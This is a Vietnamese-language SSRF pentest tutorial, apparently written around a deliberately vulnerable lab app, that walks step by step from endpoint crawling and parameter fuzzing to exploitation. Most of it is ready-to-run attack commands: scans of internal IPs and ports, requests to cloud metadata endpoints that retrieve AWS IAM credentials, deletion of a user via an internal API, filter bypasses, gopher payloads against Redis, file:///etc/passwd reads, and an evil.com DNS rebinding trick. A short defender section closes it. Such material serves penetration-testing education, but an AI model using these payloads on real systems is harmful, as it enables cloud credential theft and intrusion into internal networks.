# 🎯 **BLACK BOX SSRF DISCOVERY - KHI DEPLOY LÊN SERVER THẬT**

## 📋 **TÌNH HUỐNG:**

Bạn đã deploy dự án lên server public (VPS, AWS, Azure, etc.) tại:
```
https://yourapp.example.com
```

**Người khác (attacker) KHÔNG BIẾT:**
- ❌ Source code
- ❌ Kiến trúc hệ thống
- ❌ Có parameter `callback_url` hay không
- ❌ Backend language (Python/Java/Node.js?)
- ❌ Internal IPs

**Người khác CHỈ BIẾT:**
- ✅ Public URL: https://yourapp.example.com
- ✅ Có thể truy cập frontend
- ✅ Có thể intercept HTTP requests

---

## 🔍 **BLACK BOX METHODOLOGY - TÌM SSRF**

### **PHASE 1: RECONNAISSANCE (Thu thập thông tin)**

#### **1.1. Web Crawling - Tìm tất cả endpoints**

```bash
# Dùng tool crawl tất cả URLs
gospider -s https://yourapp.example.com -o output

# Hoặc dùng Burp Suite Spider
# Hoặc dùng OWASP ZAP Spider
```

**Mục tiêu:** Tìm tất cả các endpoints như:
```
https://yourapp.example.com/api/products/
https://yourapp.example.com/api/users/
https://yourapp.example.com/api/inventory/1/M
```

#### **1.2. Traffic Analysis với Burp Suite**

**Cách làm:**
1. Cài Burp Suite
2. Set browser proxy → Burp (127.0.0.1:8080)
3. Browse toàn bộ website
4. Burp sẽ capture TẤT CẢ requests

**Kết quả có thể thấy:**
```http
GET /api/inventory/1/M HTTP/1.1
Host: yourapp.example.com
```

---

### **PHASE 2: PARAMETER DISCOVERY (Tìm hidden parameters)**

#### **2.1. Fuzzing với wordlist**

**Dùng tool: `ffuf`, `wfuzz`, hoặc `Arjun`**

```bash
# Fuzz query parameters trên endpoint inventory
ffuf -w /path/to/params.txt -u "https://yourapp.example.com/api/inventory/1/M?FUZZ=http://collaborator.com" -mc all

# Wordlist ví dụ (params.txt):
# callback
# callback_url
# url
# webhook
# redirect
# fetch
# proxy
# target
# destination
# link
```

**Kết quả có thể:**
```bash
callback_url                [Status: 200, Size: 150]
# ↑ Tìm thấy parameter này có phản ứng khác!
```

#### **2.2. Response Time Analysis**

**Kỹ thuật:** So sánh response time để detect SSRF

```bash
# Test 1: URL không tồn tại (timeout nhanh)
time curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://192.168.1.1:9999"
# Response: ~1 second (connection refused fast)

# Test 2: URL có thật nhưng slow
time curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://httpbin.org/delay/10"
# Response: ~10 seconds (server đợi callback response!)

# Test 3: Internal IP (có service running)
time curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://169.254.169.254"
# Response: Varies (nếu có AWS metadata server)
```

**Phân tích:**
- Nếu response time thay đổi theo URL → **Có SSRF!**
- Nếu response luôn giống nhau → Không có SSRF hoặc async

---

### **PHASE 3: SSRF DETECTION (Xác nhận lỗ hổng)**

#### **3.1. Out-of-Band Detection (Burp Collaborator)**

**Cách hoạt động:**
1. Tạo unique subdomain trên Burp Collaborator
2. Inject vào parameter
3. Monitor có DNS/HTTP request đến không

**Bước thực hiện:**

```bash
# 1. Mở Burp Suite → Burp Collaborator Client
# 2. Copy Collaborator URL: abc123.burpcollaborator.net

# 3. Test SSRF
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://abc123.burpcollaborator.net/test"

# 4. Check Burp Collaborator → Có request đến!
# HTTP request received:
# GET /test HTTP/1.1
# Host: abc123.burpcollaborator.net
# User-Agent: python-requests/2.28.0
# ↑ Xác nhận backend đã gửi request!
```

**Không có Burp Suite? Dùng alternatives:**
- **Webhook.site**: https://webhook.site (free)
- **RequestBin**: https://requestbin.com
- **Interactsh**: https://app.interactsh.com

**Ví dụ với Webhook.site:**
```bash
# 1. Mở https://webhook.site → Copy unique URL
# Example: https://webhook.site/abc-123-def

# 2. Test
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=https://webhook.site/abc-123-def"

# 3. Refresh webhook.site → Thấy request từ server!
```

#### **3.2. Error-Based Detection**

**Phân tích error messages:**

```bash
# Test với invalid URL
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://invalid-domain-xyz123.com"

# Có thể nhận error:
{
  "error": "Name or service not known",
  "details": "Failed to resolve host: invalid-domain-xyz123.com"
}
# ↑ Backend đã cố gắng resolve domain → SSRF confirmed!

# Test với unreachable IP
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://192.0.2.1:9999"

# Có thể nhận error:
{
  "error": "Connection timeout",
  "details": "Failed to connect to 192.0.2.1:9999"
}
# ↑ Backend đã cố gắng connect → SSRF confirmed!
```

---

### **PHASE 4: EXPLOITATION (Khai thác)**

#### **4.1. Internal Network Scanning**

**Tìm internal services:**

```bash
# Scan common internal IPs
for ip in 10.0.0.{1..255}; do
  echo "Testing $ip..."
  time curl -s "https://yourapp.example.com/api/inventory/1/M?callback_url=http://$ip:8080" > /dev/null
done

# Phân tích response time:
# Fast timeout → No service
# Slow timeout → Service exists!
```

**Port scanning:**
```bash
# Common ports to check
PORTS="22 80 443 3306 5432 6379 8080 8081 8082 9200 27017"

for port in $PORTS; do
  echo "Testing port $port..."
  curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://localhost:$port"
done
```

#### **4.2. Cloud Metadata Exploitation**

**AWS EC2:**
```bash
# Lấy IAM credentials
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response có thể chứa:
{
  "inventory": {...},
  "callback_response": {
    "role_name": "EC2-Production-Role"
  }
}

# Tiếp tục khai thác
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role"

# Lấy được AWS keys:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
# ↑ Game over! Có thể access toàn bộ AWS account
```

**Azure VM:**
```bash
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
```

**Google Cloud:**
```bash
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

#### **4.3. Accessing Internal APIs**

**Giả sử tìm được internal user-service:**

```bash
# 1. Scan để tìm service
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://10.0.1.5:8080/health"
# Response: {"status": "healthy"} → Found user-service!

# 2. Enumerate endpoints
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://10.0.1.5:8080/api/users"
# Response: [{"id": 1, "username": "admin"}, ...]

# 3. Exploit (nếu có lỗ hổng như project này)
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://10.0.1.5:8080/api/users/delete/1"
# Xóa user ID 1!
```

---

### **PHASE 5: ADVANCED TECHNIQUES (Kỹ thuật nâng cao)**

#### **5.1. DNS Rebinding Attack**

**Mục tiêu:** Bypass IP whitelist

```python
# Setup DNS server trả về IP khác nhau
# First query: Public IP (pass validation)
# Second query: Internal IP (actual SSRF)

# 1. Setup DNS record với TTL=0
# evil.com → 1.2.3.4 (public IP)
# After 1 second: evil.com → 127.0.0.1 (localhost)

# 2. Trigger SSRF
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://evil.com/admin"
# Backend validates: evil.com → 1.2.3.4 (OK, public IP)
# Backend connects: evil.com → 127.0.0.1 (bypassed!)
```

#### **5.2. URL Parsing Confusion**

**Bypass URL filters:**

```bash
# Unicode bypass
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://127.0.0.1%E3%80%82%E3%80%82%E3%80%82%E3%80%82:8080"

# Double encoding
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://127.0.0.1%2540:8080"

# IPv6 format
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://[::1]:8080"

# Decimal IP format
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://2130706433"
# 2130706433 = 127.0.0.1 in decimal

# Octal IP format
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=http://0177.0.0.1"
```

#### **5.3. Protocol Smuggling**

**Test other protocols:**

```bash
# File protocol
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=file:///etc/passwd"

# FTP protocol
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=ftp://internal-ftp-server/sensitive-data.txt"

# Gopher protocol (SMTP, Redis, etc.)
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=gopher://localhost:6379/_SET%20exploit%201"
```

---

## 🛠️ **AUTOMATED TOOLS**

### **1. SSRFmap**
```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
python3 ssrfmap.py -r request.txt -m readfiles

# request.txt:
GET /api/inventory/1/M?callback_url=http://169.254.169.254 HTTP/1.1
Host: yourapp.example.com
```

### **2. Gopherus**
```bash
# Generate gopher payload for Redis
gopherus --exploit redis

# Output: gopher://localhost:6379/_...payload...

# Use in SSRF
curl "https://yourapp.example.com/api/inventory/1/M?callback_url=gopher://localhost:6379/..."
```

### **3. Custom Python Script**

```python
#!/usr/bin/env python3
import requests
import time

TARGET = "https://yourapp.example.com/api/inventory/1/M"
COLLABORATOR = "abc123.burpcollaborator.net"

# Test parameters
params_to_test = [
    "callback", "callback_url", "url", "webhook", 
    "redirect", "fetch", "proxy", "target", "dest"
]

for param in params_to_test:
    payload = f"http://{COLLABORATOR}/{param}"
    
    try:
        start = time.time()
        r = requests.get(TARGET, params={param: payload}, timeout=5)
        elapsed = time.time() - start
        
        print(f"[+] Parameter: {param}")
        print(f"    Status: {r.status_code}")
        print(f"    Time: {elapsed:.2f}s")
        print(f"    Size: {len(r.content)} bytes")
        
        # Check for SSRF indicators
        if elapsed > 3:
            print(f"    [!] Potential SSRF - Long response time")
        
        if "connection" in r.text.lower() or "timeout" in r.text.lower():
            print(f"    [!] Potential SSRF - Error message")
            
    except Exception as e:
        print(f"[-] Parameter: {param} - Error: {e}")
    
    print()
```

---

## 📊 **DETECTION INDICATORS**

| Indicator | Ý Nghĩa | Confidence |
|-----------|---------|------------|
| **Response time varies by URL** | Backend đang fetch URL | High |
| **DNS query to Collaborator** | Confirmed SSRF | Very High |
| **HTTP request to Collaborator** | Confirmed SSRF | Very High |
| **Connection timeout errors** | Backend trying to connect | High |
| **DNS resolution errors** | Backend trying to resolve | High |
| **Different response for internal vs external IPs** | IP-based filtering | Medium |
| **Error stack traces** | Leak backend technology | Medium |

---

## 🎯 **BLACK BOX SSRF CHECKLIST**

### **Phase 1: Discovery**
- [ ] Crawl entire website
- [ ] Map all API endpoints
- [ ] Intercept traffic with Burp Suite
- [ ] Identify endpoints accepting URLs

### **Phase 2: Parameter Fuzzing**
- [ ] Fuzz for hidden parameters (callback, url, webhook, etc.)
- [ ] Test all discovered endpoints
- [ ] Analyze response codes and times
- [ ] Document interesting parameters

### **Phase 3: SSRF Detection**
- [ ] Setup Burp Collaborator or webhook.site
- [ ] Test with Collaborator URL
- [ ] Monitor for DNS/HTTP requests
- [ ] Test response time analysis
- [ ] Analyze error messages

### **Phase 4: Exploitation**
- [ ] Test cloud metadata endpoints (169.254.169.254)
- [ ] Scan internal IPs (10.x, 172.x, 192.168.x)
- [ ] Port scan localhost (22, 80, 443, 3306, 5432, 6379, etc.)
- [ ] Enumerate internal services
- [ ] Test for sensitive data exposure

### **Phase 5: Advanced**
- [ ] Test alternate protocols (file://, ftp://, gopher://)
- [ ] Try IP encoding bypasses (decimal, octal, IPv6)
- [ ] Test DNS rebinding
- [ ] Test URL parser confusion
- [ ] Document all findings

---

## 🚨 **REAL-WORLD SCENARIO**

### **Giả sử target: https://shop.example.com**

```bash
# 1. RECONNAISSANCE
gospider -s https://shop.example.com -o endpoints.txt

# Found: /api/inventory/check?product=1&size=M

# 2. PARAMETER DISCOVERY
ffuf -w params.txt -u "https://shop.example.com/api/inventory/check?product=1&size=M&FUZZ=http://webhook.site/test"

# Found: callback_url returns different response!

# 3. SSRF CONFIRMATION
curl "https://shop.example.com/api/inventory/check?product=1&size=M&callback_url=https://webhook.site/abc123"

# Webhook.site receives request from 3.15.123.45 (AWS IP)
# User-Agent: python-requests/2.28.0
# → CONFIRMED SSRF!

# 4. CLOUD METADATA
curl "https://shop.example.com/api/inventory/check?product=1&size=M&callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response contains: "EC2-ShopBackend-Role"

curl "https://shop.example.com/api/inventory/check?product=1&size=M&callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ShopBackend-Role"

# Got AWS credentials!
# AccessKeyId: ASIA...
# SecretAccessKey: ...
# Token: ...

# 5. INTERNAL SCAN
for ip in 172.31.{1..255}.{1..255}; do
  curl -s "https://shop.example.com/api/inventory/check?product=1&size=M&callback_url=http://$ip:8080/health" | grep "healthy" && echo "Found: $ip"
done

# Found internal services:
# 172.31.10.5:8080 - User Service
# 172.31.10.6:8080 - Product Service
# 172.31.10.7:3306 - MySQL Database

# 6. EXPLOIT
curl "https://shop.example.com/api/inventory/check?product=1&size=M&callback_url=http://172.31.10.5:8080/api/admin/users"

# Access admin panel through SSRF!
```

---

## 💡 **KEY TAKEAWAYS**

### **Attacker's Perspective (Black Box):**

1. **Không cần source code** → Dùng fuzzing và behavioral analysis
2. **Out-of-band detection** → Burp Collaborator/webhook.site is your friend
3. **Response time** → Timing attack rất hiệu quả
4. **Error messages** → Leak thông tin về backend
5. **Cloud metadata** → Always test 169.254.169.254 first
6. **Automation** → Viết scripts để scan nhanh

### **Defender's Perspective:**

1. **Never trust user input** → Validate mọi URL/parameter
2. **Whitelist over blacklist** → Only allow specific domains
3. **Block private IPs** → 127.0.0.1, 10.x, 172.x, 192.168.x, 169.254.x
4. **Disable unnecessary protocols** → Only http/https
5. **Rate limiting** → Prevent mass scanning
6. **Logging & monitoring** → Detect suspicious patterns

---

## 📚 **RESOURCES**

- **PortSwigger SSRF**: https://portswigger.net/web-security/ssrf
- **OWASP SSRF**: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- **HackerOne Reports**: https://hackerone.com/reports?subject=ssrf
- **SSRFmap Tool**: https://github.com/swisskyrepo/SSRFmap
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

**Đây chính xác là cách Black Box Pentester tìm SSRF trên server thật!** 🎯
